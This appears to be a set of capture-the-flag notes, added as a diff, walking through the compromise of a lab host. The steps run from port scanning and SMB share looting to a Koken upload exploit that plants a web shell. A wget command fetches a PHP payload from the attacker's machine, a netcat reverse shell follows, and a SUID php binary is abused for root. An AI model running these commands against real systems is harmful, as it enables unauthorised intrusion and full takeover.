@@ -1,0 +1,37 @@
+1)nmap -A  -sS -T4 -p- 192.168.225.136
+    80 - http
+    139, 445 - smbdb
+    8000 - http
+
+2)enum4linux -S 192.168.225.136
+    //192.168.225.136/print$        Mapping: DENIED, Listing: N/A
+    //192.168.225.136/sambashare    Mapping: OK, Listing: OK
+
+3)smbclient //192.168.225.136/sambashare
+    get *
+        mailsent.txt
+        wordpress.bkp.zip
+
+4) koken exploit
+    from 192.168.225.136:8000
+    https://www.exploit-db.com/exploits/48706
+    daisa@photographer.com:babygirl (from mailsent.txt)
+
+    library>import content>burp
+    <your_own_machine> python3 -m http.server
+    <browser> http://192.168.225.136:8000/storage/originals/8f/cb/she.php?cmd=wget -P /tmp 192.168.225.128:0000/shell.php
+    
+    <your_own_machine> rlwrap nc -nlvp 1234
+    <browser> http://192.168.225.136:8000/storage/originals/8f/cb/she.php?cmd=php /tmp/shell.php
+
+5) privesc
+    find / -user root -perm -4000 -print 2>/dev/null
+        /usr/bin/php7.2
+
+exploit
+    CMD="/bin/sh"
+    ./usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
+
+cat /root/proof.txt
+    d41d8cd98f00b204e9800998ecf8427e
+
